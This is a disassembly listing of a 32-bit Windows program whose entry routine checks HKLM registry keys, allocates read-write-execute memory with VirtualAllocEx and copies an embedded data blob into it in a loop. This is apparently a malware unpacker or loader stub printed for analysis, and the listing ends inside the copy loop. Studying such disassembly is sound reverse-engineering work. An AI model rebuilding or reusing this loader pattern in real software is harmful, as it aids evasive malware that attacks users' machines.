0x0041a970:	pushl	%ebp	; from: 0x0041ad6e(MAY)
0x0041a971:	movl	%esp, %ebp
0x0041a973:	subl	$0xc, %esp
0x0041a976:	movl	$0x1e4dc, -8(%ebp)
0x0041a97d:	movl	$0x3000, -12(%ebp)
0x0041a984:	movl	$0x40, -4(%ebp)
0x0041a98b:	movl	-4(%ebp), %eax
0x0041a98e:	pushl	%eax
0x0041a98f:	movl	-12(%ebp), %ecx
0x0041a992:	pushl	%ecx
0x0041a993:	movl	0x8(%ebp), %edx
0x0041a996:	pushl	%edx
0x0041a997:	pushl	$0x0
0x0041a999:	pushl	$0xffffffff
0x0041a99b:	call	VirtualAllocEx@kernel32.dll	; targets: 0xff000b50(MAY)
0x0041a9a1:	movl	%ebp, %esp
0x0041a9a3:	popl	%ebp
0x0041a9a4:	ret	; targets: 0x0041ad73(MAY)

0x0041a9b0:	pushl	%ebp	; from: 0x0041ad83(MAY)
0x0041a9b1:	movl	%esp, %ebp
0x0041a9b3:	popl	%ebp
0x0041a9b4:	ret	; targets: 0x0041ad88(MAY)

0x0041a9c0:	pushl	%ebp	; from: 0x0041ada1(MAY)
0x0041a9c1:	movl	%esp, %ebp
0x0041a9c3:	subl	$0x8, %esp
0x0041a9c6:	movl	0x8(%ebp), %eax
0x0041a9c9:	movl	%eax, -4(%ebp)
0x0041a9cc:	movl	0xc(%ebp), %ecx
0x0041a9cf:	movl	%ecx, -8(%ebp)
0x0041a9d2:	movl	-4(%ebp), %edx
0x0041a9d5:	cmpl	-8(%ebp), %edx
0x0041a9d8:	jae	0x0041a9e1	; targets: 0x0041a9da(MAY)
0x0041a9da:	movl	-4(%ebp), %eax	; from: 0x0041a9d8(MAY)
0x0041a9dd:	jmp	0x0041a9e4	; targets: 0x0041a9e4(MAY)
0x0041a9e4:	movl	%ebp, %esp	; from: 0x0041a9dd(MAY)
0x0041a9e6:	popl	%ebp
0x0041a9e7:	ret	; targets: 0x0041ada6(MAY)

0x0041a9f0:	pushl	%ebp	; from: 0x0041acdb(MAY)
0x0041a9f1:	movl	%esp, %ebp
0x0041a9f3:	movl	$0x4014b4, 0x0041da30
0x0041a9fd:	popl	%ebp
0x0041a9fe:	ret	; targets: 0x0041ace0(MAY)

0x0041aa10:	pushl	%ebp	; from: 0x0041ad5f(MAY)
0x0041aa11:	movl	%esp, %ebp
0x0041aa13:	movl	0x8(%ebp), %eax
0x0041aa16:	movl	-4(%eax), %eax
0x0041aa19:	popl	%ebp
0x0041aa1a:	ret	; targets: 0x0041ad64(MAY)

0x0041ac10:	pushl	%ebp	; from: 0x0041ac87(MAY), 0x0041ac55(MAY), 0x0041acd6(MAY), 0x0041ad54(MAY), 0x0041acb2(MAY)
0x0041ac11:	movl	%esp, %ebp
0x0041ac13:	subl	$0x10, %esp
0x0041ac16:	movl	$0x60, -16(%ebp)
0x0041ac1d:	movl	$0x41c018, -4(%ebp)
0x0041ac24:	movl	$0x60, -16(%ebp)
0x0041ac2b:	movl	RegOpenKeyA@advapi32.dll, %eax
0x0041ac30:	movl	%eax, 0x0041db38
0x0041ac35:	leal	-12(%ebp), %ecx
0x0041ac38:	pushl	%ecx
0x0041ac39:	pushl	$0x41da2c
0x0041ac3e:	pushl	$0x80000002
0x0041ac43:	call	0x0041db38	; targets: 0xff000e80(MAY)
0x0041ac49:	testl	%eax, %eax
0x0041ac4b:	je	0x0041ac5a	; targets: 0x0041ac5a(MAY), 0x0041ac4d(MAY)
0x0041ac4d:	pushl	$0x1	; from: 0x0041ac4b(MAY)
0x0041ac4f:	pushl	$0x1
0x0041ac51:	pushl	$0x1
0x0041ac53:	pushl	$0x1
0x0041ac55:	call	0x0041ac10	; targets: 0x0041ac10(MAY)
0x0041ac5a:	movl	$0x60, -16(%ebp)	; from: 0x0041ace3(MAY), 0x0041ac4b(MAY)
0x0041ac61:	movl	-4(%ebp), %edx
0x0041ac64:	movb	$0x4f, 0x1(%edx)
0x0041ac68:	leal	-12(%ebp), %eax
0x0041ac6b:	pushl	%eax
0x0041ac6c:	movl	-4(%ebp), %ecx
0x0041ac6f:	pushl	%ecx
0x0041ac70:	pushl	$0x80000002
0x0041ac75:	call	0x0041db38	; targets: 0xff000e80(MAY)
0x0041ac7b:	testl	%eax, %eax
0x0041ac7d:	je	0x0041ac8c	; targets: 0x0041ac7f(MAY), 0x0041ac8c(MAY)
0x0041ac7f:	pushl	$0x1	; from: 0x0041ac7d(MAY)
0x0041ac81:	pushl	$0x1
0x0041ac83:	pushl	$0x1
0x0041ac85:	pushl	$0x1
0x0041ac87:	call	0x0041ac10	; targets: 0x0041ac10(MAY)
0x0041ac8c:	movl	$0x60, -16(%ebp)	; from: 0x0041ac7d(MAY), 0x0041ace3(MAY)
0x0041ac93:	leal	-12(%ebp), %edx
0x0041ac96:	pushl	%edx
0x0041ac97:	pushl	$0x41c024
0x0041ac9c:	movl	-12(%ebp), %eax
0x0041ac9f:	pushl	%eax
0x0041aca0:	call	0x0041db38	; targets: 0xff000e80(MAY)
0x0041aca6:	testl	%eax, %eax
0x0041aca8:	je	0x0041acb7	; targets: 0x0041acb7(MAY), 0x0041acaa(MAY)
0x0041acaa:	pushl	$0x1	; from: 0x0041aca8(MAY)
0x0041acac:	pushl	$0x1
0x0041acae:	pushl	$0x1
0x0041acb0:	pushl	$0x1
0x0041acb2:	call	0x0041ac10	; targets: 0x0041ac10(MAY)
0x0041acb7:	leal	-12(%ebp), %ecx	; from: 0x0041aca8(MAY), 0x0041ace3(MAY)
0x0041acba:	pushl	%ecx
0x0041acbb:	pushl	$0x41c064
0x0041acc0:	movl	-12(%ebp), %edx
0x0041acc3:	pushl	%edx
0x0041acc4:	call	0x0041db38	; targets: 0xff000e80(MAY)
0x0041acca:	testl	%eax, %eax
0x0041accc:	jne	0x0041acdb	; targets: 0x0041acce(MAY), 0x0041acdb(MAY)
0x0041acce:	pushl	$0x1	; from: 0x0041accc(MAY)
0x0041acd0:	pushl	$0x1
0x0041acd2:	pushl	$0x1
0x0041acd4:	pushl	$0x1
0x0041acd6:	call	0x0041ac10	; targets: 0x0041ac10(MAY)
0x0041acdb:	call	0x0041a9f0	; targets: 0x0041a9f0(MAY)	; from: 0x0041accc(MAY), 0x0041ace3(MAY)
0x0041ace0:	movl	%ebp, %esp	; from: 0x0041a9fe(MAY)
0x0041ace2:	popl	%ebp
0x0041ace3:	ret	$0x10	; targets: 0x0041ac8c(MAY), 0x0041ac5a(MAY), 0x0041acb7(MAY), 0x0041ad59(MAY), 0x0041acdb(MAY)


start:
0x0041acf0:	pushl	%ebp
0x0041acf1:	movl	%esp, %ebp
0x0041acf3:	subl	$0x70, %esp
0x0041acf6:	movl	%ebp, 0x0041db3c
0x0041acfc:	pusha	
0x0041acfd:	movl	$0x0, -60(%ebp)
0x0041ad04:	movl	$0x80000002, -80(%ebp)
0x0041ad0b:	movl	$0x0, -20(%ebp)
0x0041ad12:	movl	$0x64, -52(%ebp)
0x0041ad19:	movl	$0x12, -28(%ebp)
0x0041ad20:	movl	$0x0, -60(%ebp)
0x0041ad27:	movl	$0x0, -36(%ebp)
0x0041ad2e:	movl	$0x1, -48(%ebp)
0x0041ad35:	movl	$0x3, -24(%ebp)
0x0041ad3c:	pushl	$0x104
0x0041ad41:	pushl	$0x41da34
0x0041ad46:	call	GetWindowsDirectoryA@kernel32.dll	; targets: 0xff000b20(MAY)
0x0041ad4c:	pushl	$0x2
0x0041ad4e:	pushl	$0x2
0x0041ad50:	pushl	$0x2
0x0041ad52:	pushl	$0x2
0x0041ad54:	call	0x0041ac10	; targets: 0x0041ac10(MAY)
0x0041ad59:	movl	0x0041da30, %eax	; from: 0x0041ace3(MAY)
0x0041ad5e:	pushl	%eax
0x0041ad5f:	call	0x0041aa10	; targets: 0x0041aa10(MAY)
0x0041ad64:	addl	$0x4, %esp	; from: 0x0041aa1a(MAY)
0x0041ad67:	movl	%eax, -64(%ebp)
0x0041ad6a:	movl	-64(%ebp), %ecx
0x0041ad6d:	pushl	%ecx
0x0041ad6e:	call	0x0041a970	; targets: 0x0041a970(MAY)
0x0041ad73:	addl	$0x4, %esp	; from: 0x0041a9a4(MAY)
0x0041ad76:	movl	%eax, -56(%ebp)
0x0041ad79:	movl	-64(%ebp), %edx
0x0041ad7c:	pushl	%edx
0x0041ad7d:	pushl	$0x0
0x0041ad7f:	movl	-56(%ebp), %eax
0x0041ad82:	pushl	%eax
0x0041ad83:	call	0x0041a9b0	; targets: 0x0041a9b0(MAY)
0x0041ad88:	addl	$0xc, %esp	; from: 0x0041a9b4(MAY)
0x0041ad8b:	movl	-64(%ebp), %ecx
0x0041ad8e:	movl	%ecx, -72(%ebp)
0x0041ad91:	movl	-60(%ebp), %edx	; from: 0x0041ade6(MAY)
0x0041ad94:	cmpl	-64(%ebp), %edx
0x0041ad97:	jae	0x0041ade8	; targets: 0x0041ad99(MAY)
0x0041ad99:	movl	-72(%ebp), %eax	; from: 0x0041ad97(MAY)
0x0041ad9c:	pushl	%eax
0x0041ad9d:	movl	-52(%ebp), %ecx
0x0041ada0:	pushl	%ecx
0x0041ada1:	call	0x0041a9c0	; targets: 0x0041a9c0(MAY)
0x0041ada6:	addl	$0x8, %esp	; from: 0x0041a9e7(MAY)
0x0041ada9:	movl	%eax, -76(%ebp)
0x0041adac:	movl	-76(%ebp), %edx
0x0041adaf:	pushl	%edx
0x0041adb0:	movl	0x0041da30, %eax
0x0041adb5:	addl	-36(%ebp), %eax
0x0041adb8:	pushl	%eax
0x0041adb9:	movl	-56(%ebp), %ecx
0x0041adbc:	addl	-60(%ebp), %ecx
0x0041adbf:	pushl	%ecx
0x0041adc0:	call	0x0041b4dc	; targets: 0x0041b4dc(MAY)
0x0041adc5:	addl	$0xc, %esp
0x0041adc8:	movl	-28(%ebp), %edx
0x0041adcb:	addl	-52(%ebp), %edx
0x0041adce:	addl	-36(%ebp), %edx
0x0041add1:	movl	%edx, -36(%ebp)
0x0041add4:	movl	-60(%ebp), %eax
0x0041add7:	addl	-52(%ebp), %eax
0x0041adda:	movl	%eax, -60(%ebp)
0x0041addd:	movl	-72(%ebp), %ecx
0x0041ade0:	subl	-76(%ebp), %ecx
0x0041ade3:	movl	%ecx, -72(%ebp)
0x0041ade6:	jmp	0x0041ad91	; targets: 0x0041ad91(MAY)
0x0041b4dc:	jmp	memcpy@msvcrt.dll	; targets: 0xff000eb0(MAY)	; from: 0x0041adc0(MAY)
